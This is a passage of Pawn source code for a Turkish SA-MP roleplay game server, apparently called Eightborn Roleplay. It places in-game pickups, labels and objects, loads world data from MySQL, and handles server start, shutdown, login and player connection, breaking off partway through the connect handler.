    CreateDynamicPickup(1239, 1, 1495.7384,-1540.1769,3398.7405,567,244,-1,50);//resepsiyon
    CreateDynamicPickup(1239, 1, 1489.4712,-1517.5865,3398.7405,567,244,-1,50);//asansör
    CreateDynamicPickup(1239, 1, 328.8274,2039.5917,-15.8942,517,1,-1,50);//tutukla
    CreateDynamicPickup(1239, 1, 708.6549,393.0593,1023.5939,356,3,-1,50);//beldiyeislem
    CreateDynamicPickup(1239, 1, -1265.0060,2427.4622,3501.4866,1,1,-1,50);//pdislem
    CreateDynamic3DTextLabel(" {21825c}'/tutukla'",0xFFFFFFFF,328.8274,2039.5917,-15.8942,15,.worldid=517,.interiorid=1);//tutukla
    CreateDynamic3DTextLabel(" {21825c}'/isbasi'",0xFFFFFFFF,1150.5441,360.8029,1002.1450,5,.worldid=1,.interiorid=1);//isbasi
    CreateDynamicPickup(1239, 1, 1150.5441,360.8029,1002.1450,434,1,-1,7);//isbasi
    CreateDynamic3DTextLabel(" {21825c}'EKÝPMAN [Y]'",0xFFFFFFFF,1159.1600,375.7347,1002.1450,5,.worldid=434,.interiorid=1);//ekipman
    CreateDynamicPickup(1239, 1, 1159.1600,375.7347,1002.1450,434,1,-1,7);//ekipman
    CreateDynamicPickup(1239, 1, 642.1708,-1630.5970,11133.3740,471,1,-1,50);//hastaneislem
    CreateDynamicPickup(1239, 1, 1491.1432,1306.9702,1093.2891,473,3,-1,15);//dilkursu
    CreateDynamic3DTextLabel(" {21825c}'/dilogren'",0xFFFFFFFF,1491.1432,1306.9702,1093.2891,15,.worldid=473,.interiorid=3);//dilkursu
    CreateDynamicPickup(1239, 1, 1957.14,-2183.61,13.54,0,0,-1,15);//hava aracý
    CreateDynamic3DTextLabel(" {21825c}Hava Aracý Almak Ýçin 'Y'",0xFFFFFFFF,1957.14,-2183.61,13.54,15,.worldid=0,.interiorid=0);//hava aracý
    CreateDynamicPickup(1239, 1, 926.09,-2141.06,2.01,0,0,-1,15);//deniz aracý
    CreateDynamic3DTextLabel(" {21825c}Deniz Aracý Almak Ýçin 'Y'",0xFFFFFFFF,926.09,-2141.06,2.01,15,.worldid=0,.interiorid=0);//deniz aracý
    CreateDynamicPickup(1239, 1, 2622.1663,-1591.1311,-71.1094,373,1,-1,50);//dovus1
    CreateDynamicPickup(1239, 1, 2616.4473,-1589.2343,-71.0975,373,1,-1,50);//dovus2
    CreateDynamicPickup(1239, 1, 2072.5754,-1831.3226,13.5469); //idlewood pay&spray
    CreateDynamic3DTextLabel(" {21825c}'/a tamir'",0xFFFFFFFF,2072.5754,-1831.3226,13.5469,15);//idlewood pay&spray
	CreateDynamicPickup(1239, 1, 488.2436,-1733.6395,11.1813); //santamaria pay&spray
    CreateDynamic3DTextLabel(" {21825c}'/a tamir'",0xFFFFFFFF,488.2436,-1733.6395,11.1813,15);//santamaria pay&spray
    CreateDynamicPickup(1239, 1, 719.8125,-463.8503,16.3359); //dillimore pay&spray
    CreateDynamic3DTextLabel(" {21825c}'/a tamir'",0xFFFFFFFF,719.8125,-463.8503,16.3359,15);//dillimore pay&spray
    CreateDynamicPickup(1239, 1, 1024.9271,-1030.5604,32.0420); //temple pay&spray
    CreateDynamic3DTextLabel(" {21825c}'/a tamir'",0xFFFFFFFF,1024.9271,-1030.5604,32.0420,15);//temple pay&spray
	CreateDynamicPickup(1239, 1, HAVAARAC_POS_X,HAVAARAC_POS_Y,HAVAARAC_POS_Z); //hava arac tamir
    CreateDynamic3DTextLabel(" {21825c}'/a tamir'\n{f9f9f9} "C3"'/benzin'",0xFFFFFFFF,HAVAARAC_POS_X,HAVAARAC_POS_Y,HAVAARAC_POS_Z,30);//hava arac tamir
    for(new i=0;i<sizeof(MermiPozisyonlari);i++) {
	    CreateDynamicPickup(1239, 1, MermiPozisyonlari[i][0], MermiPozisyonlari[i][1], MermiPozisyonlari[i][2], .interiorid=floatround(MermiPozisyonlari[i][3]), .worldid=floatround(MermiPozisyonlari[i][4])); //mermial
	    CreateDynamic3DTextLabel(" {21825c}'/mermial'",0xFFFFFFFF,MermiPozisyonlari[i][0], MermiPozisyonlari[i][1], MermiPozisyonlari[i][2], 15, .worldid=floatround(MermiPozisyonlari[i][4]), .interiorid=floatround(MermiPozisyonlari[i][3]));//mermial
    }
	CreateDynamicPickup(1239, 1, 1568.6547,-1690.3953,5.8906); //lspd asansor
    CreateDynamicPickup(1313, 1, AIRSOFT_POS_X,AIRSOFT_POS_Y,AIRSOFT_POS_Z); //paintball
    CreateDynamic3DTextLabel(" {21825c}'/airsoft'",0xFFFFFFFF,AIRSOFT_POS_X,AIRSOFT_POS_Y,AIRSOFT_POS_Z,15);//paintball
    CreateDynamicPickup(1314, 1, 1699.4009,-1667.8154,20.1998); //birlik kurma
    CreateDynamic3DTextLabel(" {21825c}'/birlik'",0xFFFFFFFF,1699.4009,-1667.8154,20.1998,15);//birlik kurma
    CreateDynamicPickup(1239, 1, 1543.6100,-1706.7184,5.8906); //pdtamirspan
    CreateDynamic3DTextLabel(" {21825c}'/pdtamir'\n{ffffff} {21825c}'/pdspawn'",0xFFFFFFFF,1543.6100,-1706.7184,5.8906,10);//pdtamirspawn
    CreateDynamic3DTextLabel(" {21825c}'/fdtamir'\n{ffffff} {21825c}'/fdspawn'",0xFFFFFFFF,1105.8485,-1312.2449,13.6663,10);//pdtamirspawn
    CreateDynamic3DTextLabel(" {21825c}'/mdtamir'\n{ffffff} {21825c}'/mdspawn",0xFFFFFFFF,293.8202,-1528.9287,24.5947,5,INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 3);//pdtamirspawn
    CreateDynamicPickup(1239, 1, 293.8202,-1528.9287,24.5947,3,1);
    CreateDynamicPickup(1239, 1, 2110.9983,-2430.0818,13.5469); //pdtamirspan
    CreateDynamicPickup(1239, 1, 1275.2068,-1250.1249,13.6362); //fdtamirspan
    CreateDynamic3DTextLabel(" {21825c}''/pdtamir''",0xFFFFFFFF,2110.9983,-2430.0818,13.5469,15);//pdhavatamir
    CreateDynamicPickup(1239, 1, 1451.5310,-2287.2944,13.5469);
    CreateDynamicPickup(1239, 1, 135.5308,-279.9747,1.5781);//icecek
    CreateDynamicPickup(1239, 1, -576.0687,-504.8411,25.5234);//yiyecek
    //Seçim
    CreateDynamicPickup(1239, 1, 1794.4739,-1348.1967,2061.1934,10);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"''/oykullan''",0xECECECFF,1794.4739,-1348.1967,2061.1934,5,INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 10);
    CreateDynamicPickup(1239, 1, 1794.7137,-1346.3536,2061.1934,10);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"''/oykullan''",0xECECECFF,1794.4739,-1346.3536,2061.1934,5,INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 10);
    //Seçim
    CreateDynamicPickup(1239, 1, 1794.4739,-1348.1967,2061.1934,11);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"''/oykullan''",0xECECECFF,1794.4739,-1348.1967,2061.1934,5,INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 11);
    CreateDynamicPickup(1239, 1, 1794.7137,-1346.3536,2061.1934,11);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"''/oykullan''",0xECECECFF,1794.4739,-1346.3536,2061.1934,5,INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 11);
    //Seçim
    CreateDynamicPickup(1239, 1, 1794.4739,-1348.1967,2061.1934,12);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"''/oykullan''",0xECECECFF,1794.4739,-1348.1967,2061.1934,5,INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 12);
    CreateDynamicPickup(1239, 1, 1794.7137,-1346.3536,2061.1934,12);
    CreateDynamic3DTextLabel("{f9f9f9} "C3"''/oykullan''",0xECECECFF,1794.4739,-1346.3536,2061.1934,5,INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 12);

	WasteDeAMXersTime();
	SetGameModeText("v2.7.5 r1.1");
    ShowNameTags(0);
    SetNameTagDrawDistance(25.0);
	ShowPlayerMarkers(0);
	DisableInteriorEnterExits();
	AllowInteriorWeapons(1);
	EnableStuntBonusForAll(0);
	ManualVehicleEngineAndLights();
	//SAAT AYARLARI
 	new hour,minuite,second;
 	gettime(hour,minuite,second);
 	SetWorldTimeEx(0);
	//YUKLEMELER
	VerileriYukle();
	BenzinistasyonuYukle();
	ATMYukle();
	SecimlerYukle();
	ObjeYukle();
	InteriorYukle();
	SilahYerYukle();
	CreateYukle();
	mysql_function_query(g_iHandle, "SELECT * FROM `actor`", true, "ActorYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `ankesortelefon`", true, "AnkesorluTelefonYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `araclar`", true, "AracYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `aranmakayit`", true, "AranmaKayitYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `cctv`", true, "CCTVYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `birlikler`", true, "BirlikYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `evler`", true, "EvYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `garajlar`", true, "GarajYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `gate`", true, "GateYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `graffitiler`", true, "GraffitiYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `gps`", true, "GpsYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `gruplar`", true, "GrupYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `isyerleri`", true, "IsyeriYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `mobilya`", true, "MobilyaYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `silah`", true, "SilahYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `objeler`", true, "ObjelerYukle", "");
	mysql_function_query(g_iHandle, "SELECT * FROM `uyusturucular`", true, "UyusturucuYukle", "");
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        tanismaIsim[i] = CreateDynamic3DTextLabel("isim", COLOR_WHITE, 0.0, 0.0, 0.099, 15.0, i, .testlos=1);
        tanismaHP[i] = CreateDynamic3DTextLabel("hpbar", 0x00B900FF, 0.0, 0.0, 0.010, 15.0, i, .testlos=1);
     	gRutbeIsim[i] = CreateDynamic3DTextLabel("", 0x8D8DFFFF, 0, 0, 0.30, 15, i, .testlos=1);
     	aworkIsim[i] = CreateDynamic3DTextLabel("", 0x800000FF, 0, 0, 0.30, 15, i, .testlos=1);
	}
	Streamer_TickRate(60);
	Streamer_SetVisibleItems(STREAMER_TYPE_OBJECT , 2500);

	//mSelection listeleri
    doors2 = LoadModelSelectionMenu("doors.txt");
    walls = LoadModelSelectionMenu("walls.txt");
    bathroom = LoadModelSelectionMenu("bathroom.txt");
    beds = LoadModelSelectionMenu("beds.txt");
    chairs = LoadModelSelectionMenu("chairs.txt");
    eletronic = LoadModelSelectionMenu("eletronics.txt");
    fitness = LoadModelSelectionMenu("fitness.txt");
    kitchen = LoadModelSelectionMenu("kitchen.txt");
 	lights2 = LoadModelSelectionMenu("lights.txt");
    tables = LoadModelSelectionMenu("tables.txt");
	aliste = LoadModelSelectionMenu("aracliste.txt");
	uliste = LoadModelSelectionMenu("ucakliste.txt");
	bliste = LoadModelSelectionMenu("botliste.txt");
	barikatliste = LoadModelSelectionMenu("barikatliste.txt");
	fdbarikatliste = LoadModelSelectionMenu("fdbarikatliste.txt");
	aksesuarliste = LoadModelSelectionMenu("aksesuarliste.txt");
	pdaksesuarliste = LoadModelSelectionMenu("pdaksesuar.txt");
	mcaksesuarliste = LoadModelSelectionMenu("mcaksesuar.txt");
	erkekkiyafetbeyaz = LoadModelSelectionMenu("erkekkiyafetbeyaz.txt");
	kadinkiyafetbeyaz = LoadModelSelectionMenu("kadinkiyafetbeyaz.txt");
	erkekkiyafetsiyah = LoadModelSelectionMenu("erkekkiyafetsiyah.txt");
	kadinkiyafetsiyah = LoadModelSelectionMenu("kadinkiyafetsiyah.txt");
	yenierkekkiyafetbeyaz = LoadModelSelectionMenu("yenierkekkiyafetbeyaz.txt");
	yenikadinkiyafetbeyaz = LoadModelSelectionMenu("yenikadinkiyafetbeyaz.txt");
	yenierkekkiyafetsiyah = LoadModelSelectionMenu("yenierkekkiyafetsiyah.txt");
	yenikadinkiyafetsiyah = LoadModelSelectionMenu("yenikadinkiyafetsiyah.txt");
	egirisbeyaz = LoadModelSelectionMenu("erkekkiyafetbeyazgiris.txt");
	kgirisbeyaz = LoadModelSelectionMenu("kadinkiyafetbeyazgiris.txt");
	egirissiyah = LoadModelSelectionMenu("erkekkiyafetsiyahgiris.txt");
	kgirissiyah = LoadModelSelectionMenu("kadinkiyafetsiyahgiris.txt");
	pdkiyafeterkek = LoadModelSelectionMenu("pdkiyafeterkek.txt");
	pdkiyafetkadin = LoadModelSelectionMenu("pdkiyafetkadin.txt");
	fdkiyafeterkek = LoadModelSelectionMenu("fdkiyafeterkek.txt");
	fdkiyafetkadin = LoadModelSelectionMenu("fdkiyafetkadin.txt");
	mdkiyafeterkek = LoadModelSelectionMenu("mdkiyafeterkek.txt");
	mdkiyafetkadin = LoadModelSelectionMenu("mdkiyafetkadin.txt");
	//TIMERLAR
	foreach(new u : Player)
	{
		for(new a = 0; a < MAX_PLAYER_BLEEDS; a++)
			PlayerData[u][BleedObject][a] = INVALID_OBJECT_ID;
	}
	for(new i=0;i<MAX_VEHICLES;i++)
	{
	    AMotorDurdur[i] = true;
	    gAracParcalanabilir[i] = false;
	}
	SetTimer("Saniyebasi", 1000, 1);
	SetTimer("UpdateNameTag", 1000, 1);
	SetTimer("BaslangictaYukle", 3500, 0);

	//MapAndreas_Init(MAP_ANDREAS_MODE_FULL);

	TextDrawlariYukleEx();

    for(new i = 0; i < 3;i++) eweaps[i] = 0;
    
	ChangeColor[0] = TextDrawCreate(17.0, 138.0, "box");
    TextDrawLetterSize(ChangeColor[0], 0.0, 17.0);
    TextDrawTextSize(ChangeColor[0], 171.0, 0.0);TextDrawAlignment(ChangeColor[0], 1);
    TextDrawColor(ChangeColor[0], -1);TextDrawUseBox(ChangeColor[0], 1);
    TextDrawBoxColor(ChangeColor[0], 102);TextDrawSetOutline(ChangeColor[0], 0);
    TextDrawBackgroundColor(ChangeColor[0], 255);TextDrawFont(ChangeColor[0], 1);
    TextDrawSetProportional(ChangeColor[0], 1);TextDrawSetShadow(ChangeColor[0], 0);

    ChangeColor[1] = TextDrawCreate(138.667617, 298.116699, "Kapat");
    TextDrawLetterSize(ChangeColor[1], 0.400000, 1.600000);
    TextDrawTextSize(ChangeColor[1], 17.0, 62.327926);TextDrawAlignment(ChangeColor[1], 2);
    TextDrawColor(ChangeColor[1], -1);TextDrawUseBox(ChangeColor[1], 1);
    TextDrawBoxColor(ChangeColor[1], 102);TextDrawSetOutline(ChangeColor[1], 0);
    TextDrawBackgroundColor(ChangeColor[1], 255);TextDrawFont(ChangeColor[1], 2);
    TextDrawSetProportional(ChangeColor[1], 1);TextDrawSetShadow(ChangeColor[1], 0);
    TextDrawSetSelectable(ChangeColor[1], 1);

    new Float:X=19.0,Float:Y=139.0,count = 1;
    for(new i=2; i < sizeof(ChangeColor); i++)
    {
    	ChangeColor[i] = TextDrawCreate(X, Y, "box");
        TextDrawBackgroundColor(ChangeColor[i], AllCarColors[ColorsAvailable[i-2]]);
        TextDrawLetterSize(ChangeColor[i], 0.0, 18.0);TextDrawTextSize(ChangeColor[i], 18.0, 18.0);
        TextDrawAlignment(ChangeColor[i], 1);TextDrawColor(ChangeColor[i], -1);
        TextDrawUseBox(ChangeColor[i], 1);TextDrawBoxColor(ChangeColor[i], 0);
        TextDrawSetOutline(ChangeColor[i], 0);TextDrawFont(ChangeColor[i], 5);
        TextDrawSetProportional(ChangeColor[i], 1);TextDrawSetShadow(ChangeColor[i], 1);
        TextDrawSetPreviewModel(ChangeColor[i], 19349);
        TextDrawSetPreviewRot(ChangeColor[i], -16.0, 0.0, -180.0, 0.7);
        TextDrawSetSelectable(ChangeColor[i], 1);

        X+=19.0;
        count++;
        if(count == 9)
        {
        	Y+=19.0;
            X = 19.0;
            count = 1;
        }
	}

	/*BlackScreen = TextDrawCreate(1.000000,1.000000,"_");
	TextDrawUseBox(BlackScreen,1);
	TextDrawBoxColor(BlackScreen,0x000000ff);
	TextDrawTextSize(BlackScreen,862.000000,11.000000);
	TextDrawAlignment(BlackScreen,0);
	TextDrawBackgroundColor(BlackScreen,0x000000ff);
	TextDrawFont(BlackScreen,3);
	TextDrawLetterSize(BlackScreen,1.000000,67.099998);
	TextDrawColor(BlackScreen,0xffffffff);
	TextDrawSetOutline(BlackScreen,1);
	TextDrawSetProportional(BlackScreen,1);
	TextDrawSetShadow(BlackScreen,1);*/

	lspdkodes[0] = CreateDynamicObject(1495,199.8965000,103.4586000,958.6868000,0.0000000,0.0000000,0.0000000); //
	lspdkodes[1] = CreateDynamicObject(1495,196.4070000,103.4971000,958.6868000,0.0000000,0.0000000,178.2699000); //
	lspdkodes[2] = CreateDynamicObject(1495,188.2365000,107.1839000,958.6876000,0.0000000,0.0000000,0.0000000); //
	lspdkodes[3] = CreateDynamicObject(1495,188.2281000,110.8808000,958.6879000,0.0000000,0.0000000,0.0000000); //
	lspdkodes[4] = CreateDynamicObject(1495,193.2098000,110.9184000,958.6873000,0.0000000,0.0000000,0.0000000); //
	lspdkodes[5] = CreateDynamicObject(1495,193.2064100,107.1733000,958.6873200,0.0000000,0.0000000,0.0000000); //
	lspdkodes[6] = CreateDynamicObject(1533,240.6828000,-895.2675200,640.3261700,0.0000000,0.0000000,180.0529000); //

	// lspd garaj
	CreateDynamicObject(985,1543.6250000,-1617.6700400,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1539.6837200,-1613.7537800,11.5414000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(985,1539.6837200,-1606.4364000,11.5414000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(985,1543.6171900,-1602.4813200,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1551.4866900,-1602.4813200,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1559.3498500,-1602.4813200,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1567.2216800,-1602.4813200,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1575.0965600,-1602.4813200,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1582.9691200,-1602.4813200,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1590.8389900,-1602.4813200,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1598.7075200,-1602.4813200,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1604.0145300,-1602.4622800,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1607.9721700,-1606.4233400,11.5414000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(985,1607.9721700,-1614.2888200,11.5414000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(985,1607.9721700,-1622.1600300,11.5414000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(985,1607.9721700,-1630.0190400,11.5414000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(985,1603.9958500,-1637.8774400,11.5414000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(985,1607.9721700,-1633.9532500,11.5414000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3881,1544.0572500,-1620.6027800,14.3917000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3881,1542.7323000,-1633.3187300,14.3937000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(19362,1541.3298300,-1632.6856700,12.4578000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19362,1545.1048600,-1632.6856700,12.4578000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(8674,1545.3512000,-1640.9780300,14.4487000,0.0000000,0.0000000,90.0000000); //
	//lspdcubuk[0] = CreateDynamicObject(968,1544.69,-1630.89,13.08,0.00,90.00,90.00); // 968 1544.69 -1630.89 13.08 0.00 0.00 90.00 E
	CreateDynamicObject(1892,1544.7069100,-1623.6446500,12.3786000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1892,1544.7069100,-1622.5500500,12.3786000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19362,1545.0748300,-1622.6021700,13.0872000,0.0000000,0.0000000,90.0000000); //
	lspdgaraj[0] = CreateDynamicObject(971,1588.53,-1637.98,14.98,0.00,0.00,180.00); // 971 1596.73 -1637.98 14.98 0.00 0.00 180.00 E
	CreateDynamicObject(3089,1582.5861800,-1637.9063700,13.6962000,0.0000000,0.0000000,0.0000000); //

	//textdrawlar

 	print("=========================================");
    print("EIGHTBORN ROLEPLAY");
    print("Sürüm			: V2");
    print("Kodlayan		: meta & flavor");
    print( (mysql_errno(g_iHandle) != 0) ? ("Mysql Baðlantýsý	: Baþarýsýz") : ("Mysql Baðlantýsý	: Baþarýlý") );
    print("=========================================");
	return 1;
}

public OnGameModeExit()
{
    if(Debug) printf("OnGameModeExit()");
    CallRemoteFunction("CloseSocketConnection", "");
    new panels, doors, lights, tires;
	for(new i=0; i<GetVehiclePoolSize(); i++)
    {
    	KillTimer(FlashTime[i]);
        GetVehicleDamageStatus(i, panels, doors, lights, tires);
        UpdateVehicleDamageStatus(i, panels, doors, 0, tires);
    }
	foreach(new u : Player)
	{
		if(IsPlayerBleeding(u)) StopPlayerBleeding(u);
		if(snowOn[u])
	    {
	       	for(new j = 0; j < MAX_SNOW_OBJECTS; j++) DestroyDynamicObject(snowObject[u][j]);
	       	KillTimer(updateTimer[u]);
	   	}
	}
	//Kaydetmeler
	for(new vid; vid<MAX_VEHICLES; vid++) AracKaydet(vid);
	for(new uyid; uyid<MAX_DRUGS; uyid++) UyusturucuKaydet(uyid);
	for(new uyid; uyid<MAX_ATM; uyid++) ATMKaydet(uyid);
	for(new fid; fid<MAX_BIRLIK; fid++) BirlikKaydet(fid);
	for(new playerid; playerid<MAX_PLAYERS; playerid++)
	{
		if(IsPlayerConnected(playerid)) KarakterKaydet(playerid);
		if(Girdi[playerid]) GirdiSil(playerid);
	}
  	for(new i; i < sizeof(ChangeColor); i++)
    {
    	TextDrawDestroy(ChangeColor[i]);
    }
	return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	if(Debug) printf("OnPlayerRequestClass(%d, %d)",playerid, classid);
	if(IsPlayerNPC(playerid)) return 1;
	if(Girdi[playerid])
	{
	    return 1;
	}
	else {
		ClearScreen(playerid);
		new randommuzik = random(2);
		switch(randommuzik)
		{
			case 0: PlayAudioStreamForPlayer(playerid, "https://www.eightbornrpg.com/giris1.mp3");
			case 1: PlayAudioStreamForPlayer(playerid, "https://www.eightbornrpg.com/giris2.mp3");
		}
		TogglePlayerSpectating(playerid, true);
		//SetTimerEx("GirisKameraAyarla", 300, false, "i", playerid);
		ClearScreen(playerid);
		/*new _name[48];
		GetPlayerName(playerid, _name, sizeof(_name));
		//PlayerTextDrawSetString(playerid, IsimText[playerid], _name);
		PlayerTextDrawShow(playerid, IsimText[playerid]);*/
	    /*new randomekran = random(1);
		switch(randomekran)
		{
			case 0: TextDrawShowForPlayer(playerid, Login[0]);
			//case 1: TextDrawShowForPlayer(playerid, Login[1]);
			//case 2: TextDrawShowForPlayer(playerid, Login[2]);
			//case 3: TextDrawShowForPlayer(playerid, Login[3]);
			//case 4: TextDrawShowForPlayer(playerid, Login[4]);
		}*/
		if(GetPVarInt(playerid, "BasvuruYapiyor") == 0) {
			if(strcmp(GetUserNickname(playerid),"Yok") && strcmp(GetUserNickname(playerid),"YokBAN")) {
				SetTimerEx("SelectCharacterTextDraw", 500, false, "i", playerid);
				
				for(new i = 0; i < sizeof(AltKarakter_TD); i++) {
					TextDrawShowForPlayer(playerid, AltKarakter_TD[i]);
				}

				for(new i = 0; i < sizeof(AltKarakter_PTD[]); i++) {
					if(i != 16 && i != 18 && i != 19) {
						PlayerTextDrawShow(playerid, AltKarakter_PTD[playerid][i]);
					}
				}
			} else {
				Karakter[playerid][sqlid] = GivePlayerSQLid(Isim(playerid));
				MySQLFetchAcctSingle(Karakter[playerid][sqlid], "sifre", Karakter[playerid][sifre], 128);
				ShowMainScreen(playerid);
				TimerGirisKontrol[playerid] = SetTimerEx("GirisKontrol", 60000, false, "i", playerid);
				ShowPlayerDialog(playerid, 1, DIALOG_STYLE_PASSWORD, ""C7"EIGHTBORN - "C8"Giriþ", "{FFFFFF}Hoþgeldiniz!\nKarakteriniz sistem tarafýndan veritabanýnda kayýtlý olarak algýlandý.\n60 saniye içerisinde giriþ yapmazsanýz otomatik olarak atýlacaksýnýz.\nGiriþ yapabilmek için lütfen þifrenizi giriniz.", "Giriþ", "Çýkýþ");
			}
		}
	}
	return 1;
}

forward SelectCharacterTextDraw(playerid);
public SelectCharacterTextDraw(playerid)
{
	SelectTextDraw(playerid, 0xFFFFFFFF);
}

public OnPlayerConnect(playerid)
{
	if(Debug) printf("OnPlayerConnect(%d)",playerid);
	if(IsPlayerNPC(playerid)) return 1;
	foreach(new i : Player)
	{
		PMengelle[playerid][i] = false;
	}
    SetPVarInt(playerid, "MDC", 0);
    SetPVarInt(playerid, "SectigiDil", 0);
    for(new a = 0; a < MAX_PLAYER_BLEEDS; a++)
	{
		PlayerData[playerid][BleedObject][a] = INVALID_OBJECT_ID;
	}
	for(new i;i<MAX_VEHICLES;i++)
	{
	    Karakter[playerid][aanahtar][i] = 0;
	}
	for(new i;i<MAX_EV;i++)
	{
	    Karakter[playerid][eanahtar][i] = 0;
	}
	RemoveVendingMachines(playerid);
    Hits[playerid] = 0;
    Warnnings[playerid] = 0;
    SetPlayerWalkingStyle(playerid, WALK_DEFAULT);
    HitPlayer[playerid] = INVALID_PLAYER_ID;
    SetPVarInt(playerid, "KontrolEdildi", 0);
	SetPVarInt(playerid, "LastHP", 0);
	SetPVarInt(playerid, "LastHP1", 0);
    SetPVarInt(playerid, "last_anim", 0);
    SetPVarInt(playerid, "SilahSkinIndex", GetFreeAttachedObjectIndexEx(playerid));
	maskegiyiyor[playerid] = 0;
	mik[playerid] = 0;
	k9izin[playerid] = 0;
    /*
    IsimText[playerid] = CreatePlayerTextDraw(playerid, 234.375000, 135.916702, "Flavor_Test");
	PlayerTextDrawFont(playerid, IsimText[playerid], TEXT_DRAW_FONT_MODEL_PREVIEW);
    PlayerTextDrawUseBox(playerid, IsimText[playerid], 1);
    PlayerTextDrawBoxColor(playerid, IsimText[playerid], 0x000000FF);
    PlayerTextDrawTextSize(playerid, IsimText[playerid], 40.0, 40.0);
	PlayerTextDrawFont(playerid, IsimText[playerid], TEXT_DRAW_FONT_MODEL_PREVIEW);
	PlayerTextDrawSetPreviewModel(playerid, IsimText[playerid], Karakter[playerid][skin]);
	*/
    reklamfiyat[playerid] = 0;
	reklamgonderdi[playerid] = 0;
	reklamsira[playerid] = 0;
    SetPlayerMapIcon(playerid, 99, 2296.5569,-2330.4600,13.5469, 51, 0, MAPICON_LOCAL); //sevkiyat
    SetPlayerMapIcon(playerid, 98, 1172.4840,-1323.4226,15.4032, 22, 0, MAPICON_LOCAL); //hastane
    SetPlayerMapIcon(playerid, 97, 1458.8209,-1012.4142,26.8438, 52, 0, MAPICON_LOCAL); //banka
    SetPlayerMapIcon(playerid, 96, 2228.9509,-1722.4869,13.5552, 54, 0, MAPICON_LOCAL); //gym
    SetPlayerMapIcon(playerid, 95, 545.5507,-1289.4895,17.2422, 55, 0, MAPICON_LOCAL); //grotti
    SetPlayerMapIcon(playerid, 94, 1553.4835,-1675.3324,16.1953, 30, 0, MAPICON_LOCAL); //lspd
    SetPlayerMapIcon(playerid, 93, 2058.2844,-1912.3955,13.5469, 19, 0, MAPICON_LOCAL); //ehliyet
    SetPlayerMapIcon(playerid, 92, 2244.4951,-1663.5217,15.4766, 45, 0, MAPICON_LOCAL); //binco
    SetPlayerMapIcon(playerid, 91, 2073.4307,-1831.1239,13.5469, 63, 0, MAPICON_LOCAL); //arac tamir1
    SetPlayerMapIcon(playerid, 90, 488.0588,-1731.6213,11.8969, 63, 0, MAPICON_LOCAL); //arac tamir2
    SetPlayerMapIcon(playerid, 89, 1024.9958,-1031.3740,31.9850, 63, 0, MAPICON_LOCAL); //arac tamir3
    GarajMapIconEkle(playerid);
	BilgileriSifirla(playerid);
	SetPlayerColor(playerid,COLOR_GREY);
	ObjeleriSil(playerid);
	TextDrawlariYukle(playerid);
	//Karakter[playerid][sqlid] = VerSQLID(Isim(playerid));
	//format(Karakter[playerid][nick], 32, "%s", VerForumNick(Isim(playerid)));
	if(GivePlayerSQLid(Isim(playerid)))
	{
	    new ipmiver[32], query[512];
	    GetPlayerIp(playerid, ipmiver, sizeof(ipmiver));
		format(query, sizeof(query), "UPDATE `karakterler` SET `ip` = '%s' WHERE `id` ='%d'", ipmiver, Karakter[playerid][sqlid]);
		mysql_tquery(1,query);

   		new string[256],saat, dakika, saniye, yil, ay, gun;
       	gettime(saat, dakika, saniye);
       	getdate(yil, gun, ay);
		/**** GPCI SYSTEM *****/
		new playerserial[40];
  		gpci(playerid,playerserial,sizeof(playerserial));
		/**** GPCI SYSTEM ****/
       	GetPlayerIp(playerid, ipmiver, sizeof(ipmiver));
		new isimstring[128];
